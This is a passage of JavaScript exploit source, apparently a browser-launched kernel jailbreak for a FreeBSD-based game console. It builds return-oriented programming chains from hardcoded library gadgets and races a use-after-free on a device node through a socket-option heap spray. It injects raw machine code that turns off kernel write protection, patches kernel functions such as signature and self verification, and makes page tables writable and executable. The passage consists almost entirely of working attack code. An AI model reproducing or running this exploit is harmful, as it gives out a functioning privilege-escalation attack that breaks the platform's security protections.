  if(opts.promote===false){pairStatus.state="disabled";pairStatus.stage="disabled";pairStatus.error="promotion disabled";return prim}
  try{promoteToRealPair(opts.onEvent)}catch(e){
    if(pairStatus.state==="broken"){globalThis.p=undefined;throw new Error(`mem: promotion failed AND rollback did not verify -- window.p withdrawn. failedAt=${pairStatus.failedAt} ${pairStatus.error}`)}
  }
  return prim;
}
return {installWindowP,pairStatus};
})();

/* ============ afterglow-g.js ============ */
const Afterglow = (function(){
const S={read:3,open:5,close:6,ioctl:54,mprotect:74,socket:97,setsockopt:105,getuid:24,kqueue:362,kevent:363,mmap:477,lseek:478,thr_self:432,getpid:20,sysctl:202,cpuset_getaffinity:487,cpuset_setaffinity:488,dynlib_get_list:592,dynlib_get_info:593};
const K={anchor:0x00e6c30,swap_rbp:0x0a80f68,prison0:0x111fa18,rootvnode:0x2136e90};
const GADGETS={
  pivot:[0x0d2812,"488b67385fc3"],rdi:[0x0a6bae,"5fc3"],rsi:[0x095560,"5ec3"],rdx:[0x04e6d2,"5ac3"],
  rcx:[0x0943ee,"59c3"],store:[0x041ceb,"488907c3"],load:[0x0120b1,"488b07c3"],
  load8:[0x057fae,"488b4008c3"],add:[0x0aaf8b,"4801f8c3"],sub:[0x0275b4,"4829f8c3"],
  shr:[0x0a9ba2,"48d3e8c3"],shl:[0x0a9b98,"48d3e0c3"],memcpy:[0x026ad0,"554889e54889f8"],leave:[0x09e59d,"c9c3"]
};
const HOST={page:0x130000,free:0x130730,last:0x131000};
const TUNE={sprays:126,object:104,window:0x4000,entries:420,stride:0x90,seed:45,spare:8,units:15,batch:60,ceiling:63};
const PROBE_NODES=["/dev/rng","/dev/urandom","/dev/random","/dev/zero","/dev/null"];
const BOOTSTRAP="b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c681c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f20c0480d000001000f22c031c0c3";
const PATCHES=[
  [0x0000acd,"eb","bcopy"],[0x02bd79d,"eb","bzero"],[0x02bd7e1,"eb","pagezero"],[0x02bd85d,"eb","memcpy"],
  [0x02bd8a1,"eb","pagecopy"],[0x02bda4d,"eb","copyin"],[0x02bdefd,"eb","copyinstr"],[0x02bdfcd,"eb","copystr"],
  [0x01b7a43,"eb04","dlsym, first"],[0x01b7a53,"eb04","dlsym, second"],[0x01b7a73,"90e9","dlsym, nop+jmp"],
  [0x01b7504,"90e9","load_prx"],[0x01b7ab8,"90e93c01","dlsym, open"],[0x0628684,"eb00","self verification"],
  [0x0628f6f,"eb00","delayed panic on suspend"]
];
const STATE={ctx:null,units:{},clones:0,base:null,stubs:{},batch:undefined,retry:false};
function host(){if(!STATE.ctx)throw new Error("afterglow: no host");return STATE.ctx}
function say(fmt){host().mark("AG",fmt);try{if(/^\[(e|g|p|t|8|9|10|kp|rw)\]/.test(fmt)||/JAILBREAK|defused|thread rc|pthread_create/.test(fmt))fetch("ag_log?m="+encodeURIComponent(fmt),{keepalive:true}).catch(function(){})}catch(e){}}
const LOW=0x100000000;
function v(low,hi){return new int64(low>>>0,(hi||0)>>>0)}
function plus(a,n){return n<0?a.sub32(-n):a.add32(n)}
function same(a,b){return !!b&&a.low===b.low&&a.hi===b.hi}
function inText(a){return a.hi>=0xffffff00&&a.low!==0}
function inHeap(a){return a.hi>=0xffff0000&&a.hi<0xffffff00&&a.low!==0}
function text(a){return "0x"+a.toString(16).padStart(16,"0")}
function seedStubs(){
  const c=host();const need=new Set();
  for(const k in S){const n=S[k];if(!(c.stubAddr&&c.stubAddr.has(n))&&!STATE.stubs[n])need.add(n)}
  if(!need.size)return [];
  const base=c.libkernelBase;if(!base)return Array.from(need);
  const limit=(c.off&&c.off.k_scan_stage1)||0x200000;
  for(let o=0;o<limit&&need.size;o+=16){
    const q=c.p.read8(base.add32(o));
    if((q.low&0x00ffffff)!==0xc0c748||(q.hi>>>24)!==0x49)continue;
    const n=((q.low>>>24)|((q.hi&0x00ffffff)<<8))>>>0;
    if(!need.has(n))continue;
    STATE.stubs[n]=base.add32(o);need.delete(n);
  }
  return Array.from(need);
}
function stubFor(num){const c=host();if(STATE.stubs[num])return STATE.stubs[num];if(c.stubAddr&&c.stubAddr.has(num))return c.stubAddr.get(num);return null}
function sc(num){const a=Array.prototype.slice.call(arguments,1);const t=stubFor(num);if(!t)throw new Error("afterglow: no stub for "+num);return host().callAddr(t,a)}
function alloc(size){const c=host();const ab=new ArrayBuffer(size);const u8=new Uint8Array(ab);const dv=new DataView(ab);c.keepAlive.push(ab,u8,dv);return {ab,u8,dv,at:c.bufAddr(ab)}}
function rd4(at){return host().p.read4(at)>>>0}
function rd8(at){const r=host().p.read8(at);return v(r.low,r.hi)}
function wr1(at,b){host().p.write1(at,b&0xff)}
function wr4(at,n){host().p.write4(at,n>>>0)}
function wr8(at,q){host().p.write8(at,q)}
function rdbuf(at,len){const out=new Uint8Array(len);const pr=host().p;let i=0;
  while(i+8<=len){const q=pr.read8(plus(at,i));let lo=q.low>>>0,hi=q.hi>>>0;
    for(let k=0;k<4;k++){out[i+k]=lo&0xff;lo=lo>>>8}
    for(let k=0;k<4;k++){out[i+4+k]=hi&0xff;hi=hi>>>8}
    i+=8}
  while(i<len){out[i]=pr.read1(plus(at,i))&0xff;i++}
  return out;
}
function wrbuf(at,bytes){for(let i=0;i<bytes.length;i++)wr1(plus(at,i),bytes[i])}
function unhex(s){const o=new Uint8Array(s.length/2);for(let i=0;i<o.length;i++)o[i]=parseInt(s.substr(i*2,2),16);return o}
function sameBytes(a,b){if(a.length!==b.length)return false;for(let i=0;i<a.length;i++)if(a[i]!==b[i])return false;return true}
function pokeAt(buf,off,q){buf.dv.setUint32(off,q.low>>>0,true);buf.dv.setUint32(off+4,q.hi>>>0,true)}
function wipe(buf,len){buf.u8.fill(0,0,len)}
function cstr(s){const b=alloc(s.length+8);for(let i=0;i<s.length;i++)b.u8[i]=s.charCodeAt(i);b.u8[s.length]=0;return b}
function splitNum(n){return v(n%LOW,Math.floor(n/LOW))}
function asQ(x){return (typeof x==="number")?splitNum(x):x}
function codeAt(pageAt,off){return {
  at:plus(pageAt,off),n:0,reset(){this.n=0;return this},
  byte(b){wr1(plus(this.at,this.n),b);this.n++;return this},
  hex(s){const b=unhex(s);for(let i=0;i<b.length;i++)this.byte(b[i]);return this},
  dw(n){for(let k=0;k<4;k++)this.byte(Math.floor(n/Math.pow(256,k))%256);return this},
  qw(q){return this.dw(q.low>>>0).dw(q.hi>>>0)},
  imm(bytes){for(let i=0;i<bytes.length;i++)this.byte(bytes[i]);return this}
}}
function makeChain(buf,gad){return {
  buf,base:buf.at,n:0,fix:[],g:gad,
  slot(q){pokeAt(this.buf,this.n*8,asQ(q));this.n++;return this.n-1},
  num(n){return this.slot(asQ(n))},hole(){return this.slot(v(0,0))},
  where(i){return plus(this.base,i*8)},
  gad(name){return this.slot(this.g[name])},
  point(hole,target){this.fix.push([hole,target])},
  seal(){for(let i=0;i<this.fix.length;i++)pokeAt(this.buf,this.fix[i][0]*8,this.where(this.fix[i][1]));this.gad("leave")},
  rdi(n){this.gad("rdi");return this.num(n)},
  rsi(n){this.gad("rsi");return this.num(n)},
  rdx(n){this.gad("rdx");return this.num(n)},
  follow(off){const d=off-8;if(d>=0){this.rdi(d);this.gad("add")}else{this.rdi(-d);this.gad("sub")}this.gad("load8")},
  save_rax(at){this.rdi(at);this.gad("store")},
  load_rax(at){this.rdi(at);this.gad("load")},
  grab(dst,len){this.gad("rdi");const h=this.hole();this.gad("store");this.gad("rsi");const s=this.hole();this.point(h,s);this.rdx(len);this.rdi(dst);this.gad("memcpy");return s},
  put(dst,src,len){this.gad("rdi");this.slot(dst);this.rsi(src);this.rdx(len);this.gad("memcpy")}
}}
function shooter(gad){
  const s={g:gad,fired:0,sprayed:0,devs:[],queues:[],sockaddr:alloc(16)};
  const bs=[16,2,0x04,0xD2,0x0a,0,0,1];
  for(let i=0;i<bs.length;i++)s.sockaddr.u8[i]=bs[i];
  s.hold=function(path){const fd=sc(S.open,cstr(path).at,0).i32;if(fd>=0)this.devs.push(fd);return fd};
  s.take=function(build,room){
    this.why=null;
    if(this.hold("/dev/apm")<0){this.why="clone node refused, errno "+host().errno();return null}
    let unit=-1,watched=-1;const refused=[];
    for(let u=TUNE.ceiling;u>=0;u--){
      if(STATE.units[u])continue;
      const fd=this.hold("/dev/apm"+u);
      if(fd>=0){unit=u;watched=fd;break}
      if(refused.length<4)refused.push(u+":e"+host().errno());
    }
    if(unit<0){this.why="no apm unit 0.."+TUNE.ceiling+" ("+Object.keys(STATE.units).length+" spent, refusals "+refused.join(" ")+")";return null}
    STATE.units[unit]=true;this.fired++;
    const doomed=sc(S.open,cstr("/dev/apm"+unit).at,0).i32;
    if(doomed<0){this.why="second open refused, errno "+host().errno();return null}
    const q=sc(S.kqueue).i32;this.queues.push(q);
    const ev=alloc(32);
    const arm=function(){
      ev.dv.setUint32(0,watched>>>0,true);ev.dv.setUint32(4,0,true);ev.dv.setUint16(8,0xFFFF,true);
      ev.dv.setUint16(10,0x0001,true);ev.dv.setUint32(12,0,true);ev.u8.fill(0,16,32);
      return sc(S.kevent,q,ev.at,1,0,0,0).i32;
    };
    const armed=arm();
    if(armed!==0){this.why="kevent would not arm on unit "+unit+", rv="+armed+" errno "+host().errno();return null}
    const rop=alloc(room||0x400);const frame=alloc(0x100);wipe(frame,0x100);
    const c=makeChain(rop,this.g);c.num(0);build(c);c.seal();
    pokeAt(frame,0x38,rop.at);
    const body=alloc(TUNE.object);wipe(body,TUNE.object);
    pokeAt(body,0x38,this.g.pivot);pokeAt(body,0x58,frame.at);
    const req=alloc(40);req.dv.setUint32(0,1,true);req.dv.setUint32(4,0,true);
    pokeAt(req,8,this.sockaddr.at);req.dv.setUint32(16,16,true);pokeAt(req,24,body.at);req.dv.setUint32(32,TUNE.object,true);
    const want=TUNE.seed;
    for(let i=0;i<want;i++){if(this.hold("/dev/apm")<0)break;STATE.clones++}
    const socks=[];
    for(let i=0;i<TUNE.sprays;i++){const fd=sc(S.socket,2,2,0).i32;if(fd<0)break;socks.push(fd)}
    const hh=host();const stub=stubFor(S.setsockopt);
    if(STATE.batch===undefined&&hh.prepareMany&&stub){
      STATE.batch=0;
      for(let n=TUNE.sprays;n>=8;n=Math.floor(n*3/4)){
        try{const pc=[];for(let i=0;i<n;i++)pc.push([stub,[0,17,128,req.at,40]]);hh.prepareMany(pc);STATE.batch=n;break}catch(e){}
      }
      say("    rop stack takes "+STATE.batch+" calls per entry");
    }
    const batch=(hh.prepareMany&&hh.runPrepared&&stub)?(STATE.batch||0):0;
    const fertig=[];
    if(batch){
      const calls=[];for(let i=0;i<socks.length;i++)calls.push([stub,[socks[i],17,128,req.at,40]]);
      for(let i=0;i<calls.length;i+=batch)fertig.push(hh.prepareMany(calls.slice(i,i+batch)));
      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid),[]]]));
    }
    const t0=(typeof performance!=="undefined")?performance.now():Date.now();
    sc(S.close,doomed);
    if(batch){for(let i=0;i<fertig.length;i++)hh.runPrepared(fertig[i])}
    else{for(let i=0;i<socks.length;i++)sc(S.setsockopt,socks[i],17,128,req.at,40)}
    const t1=(typeof performance!=="undefined")?performance.now():Date.now();
    this.window=t1-t0;this.batched=batch;
    for(let i=0;i<TUNE.spare;i++)this.hold("/dev/apm");
    this.sprayed=socks.length;
    const r=arm();
    for(let i=0;i<socks.length;i++)sc(S.close,socks[i]);
    say("    window "+this.window.toFixed(2)+" ms for "+socks.length+" setsockopt in "+(this.batched?fertig.length:socks.length)+" entries");
    return r;
  };
  return s;
}
function ran(r){return r!==null&&r===-1}
function qAt(buf,off){return v(buf.dv.getUint32(off,true),buf.dv.getUint32(off+4,true))}
const GATE=0x0a0,BODY=0x0c0,OUT=0x400,FLAG=0x420,STAGE=0x440,STAGE_MAX=0x400,SIGIL=0x600D600D;
function openRing0(roomAt){
  const r={at:roomAt,body:codeAt(roomAt,BODY)};
  codeAt(roomAt,GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
  r.begin=function(){return this.body.reset()};
  r.run=function(){
    this.body.hex("48b8").qw(plus(this.at,FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at,FLAG),0);
    host().callAddr(plus(this.at,GATE),[11,plus(this.at,BODY)]);
    return (rd4(plus(this.at,FLAG))>>>0)===(SIGIL>>>0);
  };
  r.out=function(){return rd8(plus(this.at,OUT))};
  r.thread=function(){this.begin().hex("48ba").qw(plus(this.at,OUT)).hex("48893a");return this.run()?this.out():null};
  r.base=function(){const c=this.begin();c.hex("b9").dw(0xc0000082).hex("0f32");c.hex("48c1e220").hex("89c0").hex("4809c2");c.hex("48b8").qw(plus(this.at,OUT)).hex("488910");return this.run()?plus(this.out(),-0x1c0):null};
  r.copy=function(dst,src,len,guarded){
    const c=this.begin();
    if(guarded)c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);c.hex("48be").qw(src);c.hex("48b9").qw(splitNum(len));c.hex("fc").hex("f3a4");
    if(guarded)c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };
  r.apply=function(base,list){
    const c=this.begin();
    c.hex("48b9").qw(base);c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for(let i=0;i<list.length;i++){const bytes=unhex(list[i][1]);
      if(bytes.length===1)c.hex("c681");else if(bytes.length===2)c.hex("66c781");else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };
  r.read=function(at,len){len=len||8;if(!this.copy(plus(this.at,STAGE),at,len,false))return null;return rdbuf(plus(this.at,STAGE),len)};
  r.read_v=function(at){const s=this.read(at,8);if(!s)return null;let lo=0,hi=0;
    for(let i=3;i>=0;i--)lo=lo*256+s[i];for(let i=7;i>=4;i--)hi=hi*256+s[i];return v(lo,hi)};
  r.write=function(at,bytes){wrbuf(plus(this.at,STAGE),bytes);return this.copy(at,plus(this.at,STAGE),bytes.length,true)};
  r.write_v=function(at,q){const b=new Uint8Array(8);let lo=q.low>>>0,hi=q.hi>>>0;
    for(let i=0;i<4;i++){b[i]=lo%256;lo=Math.floor(lo/256)}
    for(let i=4;i<8;i++){b[i]=hi%256;hi=Math.floor(hi/256)}
    return this.write(at,b)};
  return r;
}
function isZero(q){return !q||((q.low>>>0)===0&&(q.hi>>>0)===0)}
let MAPS=null;
function findLibByShape(){
  const r={base:null,entries:0,big:0,first:[],note:null};MAPS=[];
  const pid=sc(S.getpid).i32;const mib=alloc(16);
  mib.dv.setInt32(0,1,true);mib.dv.setInt32(4,14,true);mib.dv.setInt32(8,32,true);mib.dv.setInt32(12,pid,true);
  const len=alloc(8);len.dv.setUint32(0,0,true);len.dv.setUint32(4,0,true);
  let rv=sc(S.sysctl,mib.at,4,0,len.at,0,0).i32;let need=len.dv.getUint32(0,true);
  if(rv!==0||!need){r.note="vmmap sizing rv="+rv;return r}
  const buf=alloc(need+0x8000);len.dv.setUint32(0,need+0x8000,true);len.dv.setUint32(4,0,true);
  rv=sc(S.sysctl,mib.at,4,buf.at,len.at,0,0).i32;
  const used=Math.min(len.dv.getUint32(0,true),buf.u8.length);
  if(rv!==0||!used){r.note="vmmap read rv="+rv;return r}
  const span=HOST.last;const cand=[];let off=0;
  while(off+8<=used){const size=buf.dv.getInt32(off,true);if(size<=0||off+size>used)break;r.entries++;
    const start=qAt(buf,off+8),stop=qAt(buf,off+16);MAPS.push([start,stop]);
    if(r.first.length<4)r.first.push(text(start)+"-"+text(stop));
    const bytes=(stop.hi-start.hi)*LOW+(stop.low-start.low);
    if(start.hi>0&&(start.low&0x3fff)===0&&bytes>=span){cand.push(start);r.big++}
    off+=size;
  }
  const probes=[GADGETS.pivot,GADGETS.memcpy];
  for(let i=0;i<cand.length;i++){let all=true;
    for(let k=0;k<probes.length&&all;k++){const want=unhex(probes[k][1]);if(!sameBytes(rdbuf(plus(cand[i],probes[k][0]),want.length),want))all=false}
    if(all){r.base=cand[i];return r}
  }
  r.note="no mapping carries the gadget shape ("+r.big+" of "+r.entries+" long enough)";return r;
}
function findLib(name){
  const r={base:null,rv:null,count:0,seen:[],note:null};const list=alloc(4*0x300),count=alloc(8);
  count.dv.setUint32(0,0,true);count.dv.setUint32(4,0,true);
  r.rv=sc(S.dynlib_get_list,list.at,0x300,count.at).i32;r.count=count.dv.getUint32(0,true);
  if(r.rv!==0){r.note="dynlib_get_list rv="+r.rv;return r}
  if(!r.count){r.note="module list empty";return r}
  const info=alloc(0x160);
  for(let i=0;i<r.count;i++){info.u8.fill(0);info.dv.setUint32(0,0x160,true);
    const rv=sc(S.dynlib_get_info,list.dv.getUint32(i*4,true),info.at).i32;if(rv!==0)continue;
    let nm="";for(let k=8;k<0x100&&info.u8[k]!==0;k++)nm+=String.fromCharCode(info.u8[k]);
    if(r.seen.length<6)r.seen.push(nm);
    if(nm===name){let b=qAt(info,0x108);if(!isZero(b)){r.base=b;r.at="0x108";return r}
      const cand=[];for(let o=8;o+8<=0x160;o+=8){const q=qAt(info,o);if(isZero(q))continue;if(q.hi>0x40)continue;if((q.low&0x3fff)!==0)continue;
        cand.push("+0x"+o.toString(16)+"="+text(q));if(r.base===null){r.base=q;r.at="+0x"+o.toString(16)}}
      r.note=cand.length?("base not at +0x108; grid candidates: "+cand.join(" ")):("found "+name+" but no plausible base");
      return r;
    }
  }
  r.note=name+" not among "+r.count+" modules";return r;
}
function pinCore(){
  const mask=alloc(16);mask.u8.fill(0);
  let rv=sc(S.cpuset_getaffinity,3,1,-1,16,mask.at).i32;
  if(rv!==0)return {ok:false,note:"getaffinity rv="+rv};
  let core=-1,allowed=[];
  for(let b=0;b<128;b++){if((mask.u8[b>>3]>>(b&7))&1){if(core<0)core=b;allowed.push(b)}}
  if(core<0)return {ok:false,note:"no core in mask"};
  mask.u8.fill(0);mask.u8[core>>3]=1<<(core&7);
  rv=sc(S.cpuset_setaffinity,3,1,-1,16,mask.at).i32;
  return {ok:rv===0,core,allowed:allowed.join(","),note:"setaffinity rv="+rv};
}
const PT={g1:0x1b2c394,g2:0x1b2c398,kphys:0x1b2c420,pmpml4:0x1b2c3c0,padFrom:0x10ff000,padTo:0x11ff000};
function paddingRW(k,kbase){
  const rd=function(a2){return k.read_v(a2)};const kat=function(rva){return plus(kbase,rva)};
  const g1=rd(kat(PT.g1)),g2=rd(kat(PT.g2));
  if(!g1||!g2){say("[rw] dmap dwords not readable");return null}
  const a1=g1.low>>>0,a2v=g2.low>>>0;
  const dmap=v(((a2v&3)*0x40000000)>>>0,(0xffff8000|((a1<<7)>>>0)|(a2v>>>2))>>>0);
  const kph=rd(kat(PT.kphys));if(!kph){say("[rw] KPML4phys not readable");return null}
  const p4=v((dmap.low+kph.low)>>>0,(dmap.hi+kph.hi+(((dmap.low>>>0)+(kph.low>>>0)>0xffffffff)?1:0))>>>0);
  const pm=rd(kat(PT.pmpml4));
  if(!pm||!same(pm,p4)){say("[rw] kernel_pmap->pm_pml4 is "+(pm?text(pm):"unreadable")+", calc "+text(p4)+" -- nothing written");return null}
  say("[rw] dmap "+text(dmap)+", pml4 "+text(p4)+" confirmed");
  const target=kat(PT.padFrom);
  const i4=(target.hi>>>7)&511;const i3=(((target.low>>>30)&3)|((target.hi&127)<<2))&511;const i2=(target.low>>>21)&511;
  const viaDmap=function(ent){const pl=(ent.low&0xfffff000)>>>0,ph=(ent.hi&0x000fffff)>>>0;
    return v((dmap.low+pl)>>>0,(dmap.hi+ph+(((dmap.low>>>0)+pl>0xffffffff)?1:0))>>>0)};
  const e4=rd(plus(p4,i4*8));if(!e4||(e4.low&1)===0){say("[rw] pml4 entry "+i4+" not present");return null}
  const e3at=plus(viaDmap(e4),i3*8);const e3=rd(e3at);if(!e3||(e3.low&1)===0){say("[rw] pdp entry "+i3+" not present");return null}
  if((e3.low&0x80)!==0){say("[rw] pdp entry is 1 GiB page");return null}
  const e2at=plus(viaDmap(e3),i2*8);const e2=rd(e2at);if(!e2||(e2.low&1)===0){say("[rw] pd entry "+i2+" not present");return null}
  const big=(e2.low&0x80)!==0;if(!big){say("[rw] pd entry not large page");return null}
  if(((PT.padFrom>>>21)!==(PT.padTo>>>21))){say("[rw] padding crosses 2 MiB boundary");return null}
  const needRW=(e2.low&2)===0;const needNX=(e2.hi&0x80000000)!==0;
  const pPhysLo=(e2.low&0xFFE00000)>>>0,pPhysHi=(e2.hi&0x000FFFFF)>>>0,pOff=PT.padFrom&0x1FFFFF;
  const sumLo=(dmap.low+pPhysLo+pOff)>>>0,carry=(((dmap.low>>>0)+pPhysLo+pOff)>0xFFFFFFFF)?1:0;
  const dmapPad=v(sumLo,(dmap.hi+pPhysHi+carry)>>>0);
  if(!needRW&&!needNX){say("[rw] padding already carries RW+X, dmap "+text(dmapPad));return dmapPad}
  if(!needRW&&needNX){say("[rw] padding has RW but NX set -- clearing NX")}
  const newLo=(e2.low|2)>>>0;const newHi=(e2.hi&0x7fffffff)>>>0;
  if(!k.write_v(e2at,v(newLo,newHi))){say("[rw] page directory entry not writable");return null}
  const back=rd(e2at);if(!back||(back.low&2)===0){say("[rw] RW bit did not stick");return null}
  say("[rw] RW+X set on pd entry at "+text(e2at)+", dmap "+text(dmapPad));
  return dmapPad;
}
function teardown_ring0(){/* só o caminho sem ring0 */return null}
const PADDING=0x0b3a300,OFF_STUB=0x100,OFF_DEVS=0x110,OFF_QUEUES=0x170,RET0=0x00c3c031;
function rehangRing0(k,room,ofs,list,from,copy){
  if(!list.length||list.length>256||!from)return null;
  for(let i=0;i<list.length;i++)wr4(plus(room,STAGE+i*4),list[i]);
  const c=k.begin();
  c.hex("31c0");c.hex("48be").qw(plus(room,STAGE));c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);c.hex("49b9").qw(from);c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
  c.hex("4d895308").hex("ffc0").hex("ebda");
  c.hex("48ba").qw(plus(room,OUT)).hex("488902");
  if(!k.run())return null;
  return rd4(plus(room,OUT));
}
function countOffRing0(k,room,ofs,list,copy){
  if(!list.length||list.length>256)return null;
  for(let i=0;i<list.length;i++)wr4(plus(room,STAGE+i*4),list[i]);
  const c=k.begin();
  c.hex("31c0");c.hex("48be").qw(plus(room,STAGE));c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
  c.hex("ffc0").hex("ebde");
  c.hex("48ba").qw(plus(room,OUT)).hex("488902");
  if(!k.run())return null;
  return rd4(plus(room,OUT));
}
function teardown(k,kbase,ofs,devs,queues,room){
  const kat=function(rva){return plus(kbase,rva)};
  const fileOf=function(fd){return k.read_v(plus(ofs,fd*8))};
  const stub=kat(PADDING+OFF_STUB),dtab=kat(PADDING+OFF_DEVS),qtab=kat(PADDING+OFF_QUEUES);
  say("[t] reading padding at "+text(stub));
  const there=k.read_v(stub);
  if(!there){say("[t] kernel text not readable at "+text(stub));return false}
  say("[t] it holds "+text(there));
  if((there.low>>>0)===(RET0>>>0))say("[t] stub already there");
  else if(isZero(there)){if(!k.write_v(stub,v(RET0,0))){say("[t] kernel text not writable");return false}
    const back=k.read_v(stub);if(!back||(back.low>>>0)!==(RET0>>>0)){say("[t] stub did not stick");return false}
  }else{say("[t] something else at "+text(stub)+": "+text(there));return false}
  const clone=function(from,to,what){
    for(let i=0;i<=10;i++){let q=k.read_v(plus(from,i*8));if(!q){say("[t] "+what+" unreadable at +0x"+(i*8).toString(16));return false}
      if(i===7)q=stub;
      if(!k.write_v(plus(to,i*8),q)){say("[t] "+what+" not writable");return false}
    }
    const c=k.read_v(plus(to,0x38));return c!==null&&same(c,stub);
  };
  const original=function(list,copy){
    for(let i=0;i<list.length;i++){const f=fileOf(list[i]);
      if(f&&inHeap(f)){const cur=k.read_v(plus(f,0x08));if(cur&&inText(cur)&&!same(cur,copy))return cur}
    }
    return null;
  };
  const ready=function(copy){const c=k.read_v(plus(copy,0x38));return c!==null&&same(c,stub)};
  const rehang=function(list,from,copy){
    let m=0;
    for(let i=0;i<list.length;i++){const f=fileOf(list[i]);const cur=(f&&inHeap(f))?k.read_v(plus(f,0x08)):null;
      if(cur&&same(cur,copy))m++;else if(cur&&from&&same(cur,from)&&k.write_v(plus(f,0x08),copy))m++;
    }
    return m;
  };
  say("[t] looking for device table across "+devs.length+" handles");
  const devOps=original(devs,dtab);
  if(devOps){if(!ready(dtab)&&!clone(devOps,dtab,"device table"))return false}
  else if(!ready(dtab)){say("[t] no device table to copy -- nothing done");return false}
  let moved=rehangRing0(k,room,ofs,devs,devOps,dtab);
  if(moved===null){say("[t] rehanging one at a time");moved=rehang(devs,devOps,dtab)}
  say("[t] "+moved+" of "+devs.length+" handles on the copy");
  let movedq=0;
  if(queues&&queues.length){
    const qOps=original(queues,qtab);
    if(qOps&&!same(qOps,devOps||qtab)){if(ready(qtab)||clone(qOps,qtab,"queue table"))movedq=rehang(queues,qOps,qtab)}
    else if(ready(qtab))movedq=queues.length;
  }
  say("[t] "+movedq+" of "+(queues?queues.length:0)+" queues on the copy");
  let notes=0;
  for(let i=0;queues&&i<queues.length;i++){
    const f=fileOf(queues[i]);if(!f||!inHeap(f))continue;
    const kq=k.read_v(f);if(!kq||!inHeap(kq))continue;
    const w=k.read_v(plus(kq,0xa0));if(!w)continue;
    if((w.hi>>>0)!==0){if(k.write_v(plus(kq,0xa0),v(w.low,0)))notes++}else notes++;
  }
  say("[t] note lists emptied on "+notes+" of "+(queues?queues.length:0)+" queues");
  let left=countOffRing0(k,room,ofs,devs,dtab);
  if(left===null){left=0;for(let i=0;i<devs.length;i++){const f=fileOf(devs[i]);const cur=(f&&inHeap(f))?k.read_v(plus(f,0x08)):null;if(!(cur&&same(cur,dtab)))left++}}
  if(left===0&&moved>0){say("[t] all "+devs.length+" handles on the copy");return true}
  say("[t] "+left+" handles still on original -- page must not go away");
  return false;
}
function probeAfterglow(ctx){
  STATE.ctx=ctx;const out={ok:false,reasons:[]};const no=function(why){out.reasons.push(why)};
  const noStub=seedStubs();
  out.stubs=noStub.length?("missing "+noStub.join(",")):"all resolved";
  if(noStub.length)no("no libkernel stub for syscall "+noStub.join(","));
  let lib=findLib("libSceLibcInternal.sprx");
  if(!lib.base){const m=findLibByShape();if(m.base)lib={base:m.base,at:"gadget shape",count:lib.count,seen:lib.seen};else say("AG libc: "+m.note+" | entries="+m.entries+" first=["+m.first.join(" ")+"]")}
  const libc=lib.base;
  out.libc=libc?(text(libc)+" via "+lib.at):"not found";out.modules=lib.count;
  if(!libc){no(lib.note||"libc not mapped");say("probe: stubs="+out.stubs+" modules="+lib.count+" rv="+lib.rv+" seen=["+lib.seen.join(" ")+"] -- "+out.reasons.join("; "));return out}
  let missing=null;
  for(const name in GADGETS){const want=unhex(GADGETS[name][1]);if(!sameBytes(rdbuf(plus(libc,GADGETS[name][0]),want.length),want)){missing=name;break}}
  out.gadgets=missing?("missing "+missing):"all present";
  if(missing)no("gadget "+missing+" is missing -- different libc");
  let dirty=0;
  for(let off=0;off<=HOST.last-HOST.free-4;off+=4){if(rd4(plus(libc,HOST.free+off))!==0)dirty++}
  out.tail=(HOST.last-HOST.free)+" bytes, "+dirty+" dwords non-zero";
  if(dirty)no("spare room behind libc occupied");
  let node=null;
  for(let i=0;i<PROBE_NODES.length;i++){const fd=sc(S.open,cstr(PROBE_NODES[i]).at,0).i32;if(fd>=0){node=PROBE_NODES[i];break}}
  out.probeNode=node;if(!node)no("no usable device node");
  const held=[];
  for(let i=0;i<20;i++){const fd=sc(S.open,cstr("/dev/apm").at,0).i32;if(fd<0)break;held.push(fd)}
  out.apm=held.length?(held.length+" clones held"):("refused, errno "+host().errno());
  if(!held.length)no("/dev/apm cannot be opened");
  const open=[],refused=[];
  for(let u=0;u<32;u++){const fd=sc(S.open,cstr("/dev/apm"+u).at,0).i32;if(fd>=0){open.push(u);sc(S.close,fd)}else if(refused.length<3)refused.push(u+":e"+host().errno())}
  out.units=open.length;out.unitList=open.length?open.join(","):"none";out.unitRefused=refused.join(" ")||"-";
  if(open.length<3)no("only "+open.length+" apm units with "+held.length+" clones held");
  const pin=pinCore();out.pin=pin.ok?("core "+pin.core+" of ["+pin.allowed+"]"):("FAILED: "+pin.note);
  if(!pin.ok)no("cannot pin to a cpu: "+pin.note);
  const socks=[];
  for(let i=0;i<TUNE.sprays;i++){const fd=sc(S.socket,2,2,0).i32;if(fd<0)break;socks.push(fd)}
  out.udp=socks.length;
  if(socks.length){
    const body=alloc(TUNE.object);body.u8.fill(0);
    const req=alloc(40);req.dv.setUint32(0,1,true);pokeAt(req,8,alloc(16).at);req.dv.setUint32(16,16,true);pokeAt(req,24,body.at);req.dv.setUint32(32,TUNE.object,true);
    const stub=stubFor(S.setsockopt);
    const nb=(host().prepareMany&&host().runPrepared&&stub)?(STATE.batch||TUNE.batch):0;
    let t0,t1;
    if(nb){
      const calls=[];for(let i=0;i<socks.length;i++)calls.push([stub,[socks[i],17,128,req.at,40]]);
